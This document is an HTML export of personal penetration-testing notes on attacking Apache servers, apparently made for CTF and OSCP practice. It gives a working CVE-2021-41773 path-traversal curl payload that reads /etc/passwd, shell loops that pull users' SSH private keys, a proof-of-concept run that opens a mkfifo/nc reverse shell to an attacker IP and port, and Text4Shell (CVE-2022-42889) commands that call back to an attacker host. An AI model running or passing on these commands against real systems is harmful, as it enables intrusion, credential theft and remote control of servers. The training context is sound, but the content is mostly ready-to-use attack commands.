<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Apache</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Apache</h1><br/><p><a name="Configuration Files"></a><h1>Configuration Files</h1></p><p><h2>Subdomain Enumeration</h2></p><p>You may find subdomains listed in configuration files. Check the following directory. For example, if there&#39;s the <strong>dev</strong> subdomain, you may find a file named <strong>dev.conf</strong>.</p><p></p><p><strong>/etc/apache2/sites-enabled/</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you&#39;re using Directory Traversal, you can try fuzzing this directory using a subdomain wordlist &amp; the <strong>.conf</strong> extension (e.g. <strong>/etc/apache2/sites-enabled/</strong>FUZZ<strong>.conf</strong>)</p><p></p><p><h2>Password Hashes</h2></p><p>Depending on the Auth Mechanism used by the target, you may find password hashes in <strong>.htpasswd</strong> / <strong>htpasswd</strong></p><p></p><p><h1>Version 2.4.49 &amp; 2.4.50 (CVE-2021-41773)</h1></p><p>[CTF B 229-230]</p><p>May need <span style="color:#ff0000;">diff payload for Apache 2.4.49 &amp; 2.4.50</span>. For ex, I think 2.4.50 may need double URL-Encoding, but check Exploit-DB</p><p></p><p>Dir Trav &amp; potentially RCE (see <a href="file:///home/asura/sploits/apache/2.4.49_50383.sh">PoC</a> which takes a list of targets)</p><p></p><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013">https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013</a></p><p></p><p>I believe a certain setting needs to be toggled in addition to having the vuln version in order to get RCE (idk). Kept spasing out with binary output whenever I tried simple RCE (e.g whoami)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">Even if Dir Trav fails, RCE may still work &amp; vice versa</span>!</p><p></p><p><h2>Manual Directory Traversal</h2></p><p>[CTF B 24-25 &amp; OSCP 53-54 &amp; Portswigger 13-14]</p><p></p><p><em>curl --path-as-is &quot;http://192.168.235.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot; --proxy “http://localhost:8080”</em></p><p></p><p><h3>Find SSH Keys</h3></p><p>See <a href="Recon_+_Services--WebApp_12.html#Find SSH Key">link</a>. Added list of users from /etc/passwd into a wordlist &amp; ran</p><p></p><p><em>for i in $(cat users.txt); do for k in $(cat /usr/share/wordlists/ssh_PrivKey_names.txt); do echo &quot;User: $i&quot;; echo &quot;Key Name: $k&quot;; curl --path-as-is &quot;http://192.168.239.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/$i/.ssh/$k&quot;; echo &quot;===============&quot;; done; done</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Determine who has SSH setup</span>: If you can&#39;t find the priv key, may be able to guess who has SSH setup like-</p><p></p><p><em>for i in $(cat users.txt); do curl --path-as-is &quot;http://192.168.239.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/$i/.ssh/authorized_keys&quot;; done</em></p><p></p><p><h2>RCE</h2></p><p> <a href="file:///home/asura/sploits/apache/2.4.49_50383.sh">PoC</a> throws a couple errors, but you can ignore them.</p><p> </p><p> Add target&#39;s IP to file- <strong>targets.txt</strong></p><p> </p><p><em>~/sploits/apache/2.4.49_50383.sh targets.txt /bin/sh id</em></p><p></p><p><em>~/sploits/apache/2.4.49_50383.sh targets.txt /bin/sh &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f&quot;</em></p><p></p><p><h1>Dependency- Apache Commons Text</h1></p><p>[OSCP 222]</p><p><a href="https://github.com/gustanini/CVE-2022-42889-Text4Shell-POC/tree/main">CVE-2022-42889 (Text4Shell)</a></p><p></p><p><h2>Confirmation</h2></p><p><em>python3 text4shell.py -u &#39;http://TARGET:8080/search?query=&#39; -c &#39;ping -c 3 ATKER&#39; -m rce</em><em></em></p><p><em></em><em></em></p><p><em>python3 text4shell.py -u &#39;http://TARGET:8080/search?query=&#39; -m &#39;ssrf&#39; -s ‘http://ATKER’</em></p></div>
</body>
</html>
